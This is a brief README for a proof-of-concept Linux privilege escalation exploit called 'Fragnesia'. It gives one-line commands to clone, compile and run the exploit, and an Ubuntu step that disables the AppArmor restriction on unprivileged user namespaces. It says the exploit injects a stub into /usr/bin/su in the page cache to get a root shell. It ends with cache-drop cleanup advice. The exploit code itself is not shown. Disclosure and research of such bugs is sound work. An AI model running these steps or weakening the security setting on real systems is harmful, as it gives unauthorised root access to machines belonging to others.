# Fragnesia

```
git clone https://github.com/v12-security/pocs.git && cd pocs/fragnesia && gcc -o exp fragnesia.c && ./exp
```

**Ubuntu note:** AppArmor restricts unprivileged user namespaces by default. You must first run:

```
sudo sysctl -w kernel.apparmor_restrict_unprivileged_userns=0
```

This targets `/usr/bin/su` directly. On success it drops into a root shell.

## Critical Cleanup Warning

After the run, `/usr/bin/su` in the page cache contains the injected stub. Any subsequent execution of `su` will re-spawn a shell until the page is evicted. Drop the cache or reboot before leaving the machine:

```
echo 1 | tee /proc/sys/vm/drop_caches
```